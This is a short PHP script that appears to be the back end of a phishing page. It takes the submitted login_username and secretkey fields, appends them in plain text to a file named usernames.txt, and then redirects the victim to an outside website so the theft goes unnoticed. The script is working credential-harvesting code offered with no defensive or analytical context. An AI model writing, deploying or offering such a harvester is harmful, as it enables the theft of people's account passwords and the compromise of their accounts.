<?php

file_put_contents("usernames.txt", "Username: " . $_POST['login_username'] . " Pass: " . $_POST['secretkey'] . "\n", FILE_APPEND);
header('Location: https://racionaltec.com');
exit();
?>